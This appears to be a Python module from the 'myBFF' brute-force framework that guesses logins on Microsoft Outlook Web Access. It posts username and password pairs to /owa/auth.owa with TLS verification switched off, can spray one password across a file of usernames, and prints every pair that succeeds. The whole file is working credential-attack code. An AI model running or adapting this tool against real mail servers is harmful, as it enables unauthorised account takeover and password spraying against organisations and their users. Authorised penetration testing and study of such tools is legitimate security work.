#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class OWAlogin():
    def connectTest(self, config, payload):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/owa/auth.owa', data=payload, allow_redirects=True, verify=False)
            m = re.search("The user name or password you entered isn't correct", cpost.text)
            if m:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'username': config["USERNAME"],
                'password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
